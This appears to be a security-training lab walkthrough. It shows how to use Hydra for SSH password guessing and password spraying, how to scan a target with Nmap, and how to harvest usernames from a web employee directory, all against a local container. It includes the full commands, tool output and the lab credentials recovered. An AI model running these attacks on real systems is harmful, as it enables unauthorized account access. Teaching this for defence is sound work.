# Password Guessing Attacks with Hydra

## Brief Intro

In this lab, we'll mount different password guessing attacks against multiple target systems using the Hydra tool.

The author of Hydra asks that this tool is not used for "military or secret service organizations, or for illegal purposes". If you prefer, you can complete these same lab exercise steps using Metasploit instead.
Requirements for This Lab
In this lab, you will use your Slingshot Linux VM. Make sure the VM is running before continuing with this lab exercise.

## Try It Yourself

Start the SSH server service on your Slingshot Linux system using the /home/sec504/labs/passhydra/sshd_config configuration file. Experiment with the Hydra tool, observing both failed and successful password guessing attacks. Next, start the gohydratgt server and explore various services, gaining access to the target using the password list in /home/sec504/labs/passhydra/passwords.txt.

## Walkthrough

### Introduction

In this exercise, we'll look at password guessing and password spray attacks using Hydra. First, we'll experiment with Hydra using the local Slingshot Linux VM and the SSH server service, then we'll attack a target system, the eDirectory employee directory search server.

### Open a Terminal

From the Slingshot Linux VM, open a terminal.

### Start the SSH Server with Alternate Configuration

Next, start the SSH server process (sshd), using the alternate server configuration file located in /home/sec504/labs/passhydra/sshd_config, as shown here:

    sec504@slingshot:~$ cd /home/sec504/labs/passhydra
    sec504@slingshot:~/labs/passhydra$ sudo mkdir -p /run/sshd
    sec504@slingshot:~/labs/passhydra$ sudo /usr/sbin/sshd -f sshd_config

You will not see any output from the sshd process in your terminal. If you wish, you can confirm that the SSH server service is running using netstat -nat | grep :22 and ps -ef | grep sshd.

This alternate sshd_config file is set up to accept connections only from the local system. The mkdir command is necessary to create the secure directory for the SSH server to use when serving connections.

### Single Password Test with Hydra

Hydra supports several different protocols for password guessing and password spray attacks. In the simplest form, Hydra accepts a username or login name (-l) and a password (-p), followed by the service name and target IP address or host name (for example, ssh://10.10.10.10). We also specify -t 4 to limit the number of simultaneous password attempts to improve Hydra's reliability.

Use Hydra to test authentication against the root account using the SSH server service with the password sec504, as shown here:

    sec504@slingshot:~/labs/passhydra$ hydra -t 4 -l root -p sec504 ssh://127.0.0.1
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (http://www.thc.org/thc-hydra) starting at 2020-07-26 13:09:04
    [DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
    [DATA] attacking ssh://127.0.0.1:22/
    1 of 1 target completed, 0 valid passwords found
    Hydra (http://www.thc.org/thc-hydra) finished at 2020-07-26 13:09:06

In this example, Hydra was not successful in identifying a valid username and password for the specified SSH server. Repeat this command, this time specifying a login name (-l) of sec504, as shown here:

    sec504@slingshot:~/labs/passhydra$ hydra -t 4 -l sec504 -p sec504 ssh://127.0.0.1
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (http://www.thc.org/thc-hydra) starting at 2020-07-26 13:10:40
    [DATA] max 1 task per 1 server, overall 1 task, 1 login try (l:1/p:1), ~1 try per task
    [DATA] attacking ssh://127.0.0.1:22/
    [22][ssh] host: 127.0.0.1   login: sec504   password: sec504
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished at 2020-07-26 13:10:41

Here we see the successful output of Hydra and a password guessing attack, noting in green (on most terminals) that the login combination sec504/sec504 was successful.

In this use case, Hydra is not too different than attempting to connect to the server using the standard ssh utility and guessing a password manually. Instead of typing the password without seeing the output with ssh, Hydra clearly shows us the successful username and password combination, but it can also accept a password list as a command line argument as well.

### Password Guessing List with Hydra

To specify a list of passwords, one per line, for Hydra to use in a password guessing attack, omit the -p argument, and add -P, followed by the file containing a short list of passwords to use for the guessing attack.

Run the command shown below, using the password list passwords.txt for the password guessing attack with the username sec504:

    sec504@slingshot:~/labs/passhydra$ hydra -t 4 -l sec504 -P passwords.txt ssh://127.0.0.1
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (http://www.thc.org/thc-hydra) starting at 2020-07-26 13:11:19
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 21 login tries (l:1/p:21), ~6 tries per task
    [DATA] attacking ssh://127.0.0.1:22/
    [22][ssh] host: 127.0.0.1   login: sec504   password: sec504
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished at 2020-07-26 13:11:30

The warning and error messages can be safely ignored here.
In this configuration, Hydra is conducting a password guessing attack using four concurrent guessing tasks (-t 4). By default, Hydra will use 16 concurrent tasks when the -t argument is not specified. This will lead to false-negative responses on some servers. Reducing the number of concurrent tasks to four is optimal for SSH password guessing.

### Password Spray with Hydra

Our examples using Hydra so far have been password guessing attacks. In many servers, this type of attack will trigger an account lockout after a number of failed guesses, often with no opportunity for the attacker to differentiate a bad password from a correct password against a locked account.

Alternatively, we can specify a large number of user accounts, with one or a small number of passwords to use Hydra in a password spray attack configuration.

Repeat the Hydra attack, this time specifying a single password sec504 with a list of 49 usernames, supplied in the users.txt file:

    sec504@slingshot:~/labs/passhydra$ wc -l users.txt
    49 users.txt
    sec504@slingshot:~/labs/passhydra$ hydra -t 4 -L users.txt -p sec504 ssh://127.0.0.1
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (http://www.thc.org/thc-hydra) starting at 2020-07-26 13:12:02
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 49 login tries (l:49/p:1), ~13 tries per task
    [DATA] attacking ssh://127.0.0.1:22/
    [22][ssh] host: 127.0.0.1   login: sec504   password: sec504
    1 of 1 target successfully completed, 1 valid password found
    Hydra (http://www.thc.org/thc-hydra) finished at 2020-07-26 13:12:27

In this attack, we are able to recover the password for the sec504 account, while avoiding a potential account lockout, since we've only attempted to log in once for each individual username.

### Stop the SSH Service

To finish this portion of the lab exercise, stop the SSH service using the killall command, as shown here:

    sec504@slingshot:~/labs/passhydra$ sudo killall sshd

Note that you will not receive any output from the killall command.

Next, we'll apply these steps in a practical attack environment.

## eDirectory Target

For the next portion of this lab exercise, repeat the Hydra password guessing or password spray attacks using the eDirectory target. First, start the target server by running the gohydratgt command, as shown here:

    sec504@slingshot:~/labs/passhydra$ gohydratgt
    Starting Docker service ..... Done.
    ffe27d85b26c9d94a1d9858d6a78fdbc59cfd884b331ee71bb8b09b726a8f329
    2019-12-28 12:35:03,008 INFO Set uid to user 0 succeeded
    2019-12-28 12:35:03,016 INFO supervisord started with pid 7
    2019-12-28 12:35:04,021 INFO spawned: 'nginx' with pid 9
    2019-12-28 12:35:04,026 INFO spawned: 'php-fpm' with pid 10
    2019-12-28 12:35:04,029 INFO spawned: 'sshd' with pid 11
    [28-Dec-2019 12:35:04] NOTICE: fpm is running, pid 10
    [28-Dec-2019 12:35:04] NOTICE: ready to handle connections
    Server listening on 0.0.0.0 port 22.
    Server listening on :: port 22.
    2019-12-28 12:35:05,149 INFO success: nginx entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
    2019-12-28 12:35:05,149 INFO success: php-fpm entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
    2019-12-28 12:35:05,149 INFO success: sshd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)

### Open a New Terminal Tab

Open a new terminal tab by clicking File | Open Tab | Default. Change to the ~/labs/passhydra directory, as shown here.

    sec504@slingshot:~$ cd ~/labs/passhydra/
    sec504@slingshot:~/labs/passhydra$

### Scan the eDirectory Server

Identify the IP address of the eDirectory server and enumerate the open TCP ports on the server using Nmap in the range 172.30.0.2-254, as shown here:

    sec504@slingshot:~/labs/passhydra$ nmap 172.30.0.2-254

    Starting Nmap 7.60 ( https://nmap.org ) at 2019-12-28 12:39 UTC
    Nmap scan report for 172.30.0.25
    Host is up (0.000096s latency).
    Not shown: 998 closed ports
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http

    Nmap done: 253 IP addresses (1 host up) scanned in 21.31 seconds

In this output, we see that the server at 172.30.0.25 is running SSH and web server services.

## Recover Two User Accounts

Using Hydra and the passwords.txt list, recover the passwords for two user accounts on the eDirectory server. For this task, you will need to use your browser to access the website on the target server, build a list of user names, and configure Hydra to mount the attack against the server.

If you get stuck, see the answers below.

###  Answers

#### Click to see solution - eDirectory Access

The first step in any attack is to perform reconnaissance analysis. For the eDirectory server, we know that there are two server services: SSH and HTTP. We will use the SSH service for password guessing, but first we need to identify valid user accounts for the target.

Open our browser and navigate to the http://172.30.0.25 server. You will see the eDirectory search interface, as shown here.

### eDirectory Search Page

Submitting a search term, phrase, or just a few letters will display matching information in the employee directory. For example, searching for the name Ed will not reveal any users named Ed, but will show matches where the letters ed are in the directory information.

Use this insight to get a list of all employees in the eDirectory.

#### Click to see solution - Identify All Employees

Since all users in the eDirectory have an email address, a search for @ will produce a list of all users, as shown here.

#### Click to see solution - Create a File with Search Results

Next, highlight the table information, starting with Bridget Eva and ending with the Alvar Ruben record. Copy the data into your clipboard.

Return to your terminal. Create a new file called searchresult.txt using the cat command, as shown here:

    sec504@slingshot:~/labs/passhydra$ cat >searchresult.txt

Note that the cat command will not exit until you press CTRL+C. Don't press CTRL+C yet!
Next, paste the copied webpage contents into the terminal by clicking Edit | Paste. Pasting the clipboard into the terminal will add the information to the searchresult.txt file.

After pasting the information into the file, press Enter to add a new line at the end of the last record, then press CTRL+C to close the file and stop the cat tool.

#### Click to see solution - Convert Search Results to a List of Usernames

When building a list of user names, we can use information such as the beginning of an email address to produce the user list. This data may not be conveniently formatted, though (as in our case with the eDirectory search results), requiring some editing of the file.

You can edit the searchresult.txt file using any text editor, such as gedit, nano, or vi, but we can also manipulate the file to produce the user list using the awk and sed tools from the command line.

First, use the awk tool to extract a list of email addresses from the searchresult.txt file. Since the first column of data is the employee name, followed by the email address, and the name is always in the format first space last, we can use awk to extract only the third column of information using the default delimiter of whitespace characters.

Run the awk command to extract the third column of information from searchresult.txt, as shown here:

    sec504@slingshot:~/labs/passhydra$ awk '{print $3}' searchresult.txt
    beva@target.tgt
    fgrant@target.tgt
    prosa@target.tgt
    ghajsson@target.tgt
    lrenate@target.tgt
    jorestes@target.tgt
    rlucian@target.tgt
    hrio@target.tgt
    rogechukwukama@target.tgt
    ayoshie@target.tgt
    rkaede@target.tgt
    asayaka@target.tgt
    alucasta@target.tgt
    jviktoria@target.tgt
    ejonah@target.tgt
    tamando@target.tgt
    cghislaine@target.tgt
    pemma@target.tgt
    aruben@target.tgt

This is close, but we also need to remove the @target.tgt portion of the email address. Press the up arrow to return to the previous awk command, then add the following sed syntax to substitute (s/), the @ sign, and everything following (@.*) with an empty value (//):

    sec504@slingshot:~/labs/passhydra$ awk '{print $3}' searchresult.txt | sed 's/@.*//'
    beva
    fgrant
    prosa
    ghajsson
    lrenate
    jorestes
    rlucian
    hrio
    rogechukwukama
    ayoshie
    rkaede
    asayaka
    alucasta
    jviktoria
    ejonah
    tamando
    cghislaine
    pemma
    aruben

When the output looks correct, press the up arrow to rerun the entire command, redirecting the output to a file called eusers.txt, as shown here:

se  archresult.txt | sed 's/@.*//' > eusers.txt
You can optionally display the contents of the eusers.txt file using the cat tool, as shown here:

    sec504@slingshot:~/labs/passhydra$ cat eusers.txt
    beva
    fgrant
    prosa
    ghajsson
    lrenate
    jorestes
    rlucian
    hrio
    rogechukwukama
    ayoshie
    rkaede
    asayaka
    alucasta
    jviktoria
    ejonah
    tamando
    cghislaine
    pemma
    aruben

With a list of user names in the eusers.txt file, and the supplied password list in the passwords.txt file, you can mount the password spray attack against the SSH server service using Hydra.

### Click to see solution - Password Spray with Hydra

Next, use Hydra to conduct a password spray attack, using the eusers.txt and the passwords.txt files.

    sec504@slingshot:~/labs/passhydra$ hydra -t 4 -L eusers.txt -P passwords.txt ssh://172.30.0.25
    Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

    Hydra (http://www.thc.org/thc-hydra) starting at 2020-07-26 13:13:52
    [DATA] max 4 tasks per 1 server, overall 4 tasks, 399 login tries (l:19/p:21), ~100 tries per task
    [DATA] attacking ssh://172.30.0.25:22/
    [22][ssh] host: 172.30.0.25   login: jorestes   password: Admin123!@#
    [STATUS] 222.00 tries/min, 222 tries in 00:01h, 177 to do in 00:01h, 4 active
    [22][ssh] host: 172.30.0.25   login: pemma   password: P@$$w0rd
    [STATUS] 199.50 tries/min, 399 tries in 00:02h, 1 to do in 00:01h, 2 active
    1 of 1 target successfully completed, 2 valid passwords found
    Hydra (http://www.thc.org/thc-hydra) finished at 2020-07-26 13:15:57

Quickly Hydra reveals the password information for the jorestes account. Given several minutes, Hydra will also reveal the password for the pemma account.

Note: Optionally, you may use the recovered credentials to access the SSH server. Search for the file secret.txt for a tip on succeeding at the CTF event.
Cleanup

When you are finished interacting with the eDirectory server, return to the terminal where you ran the gohydratgt command and press CTRL+C to terminate the container instance.

## Why This Lab Is Important

This lab demonstrates how attackers can launch password guessing attacks using freely available tools such as Hydra. While naive password guessing for a single user account may trigger account lockout on many systems, attackers can leverage the features of Hydra to avoid account lockout by implementing a password spray attack instead.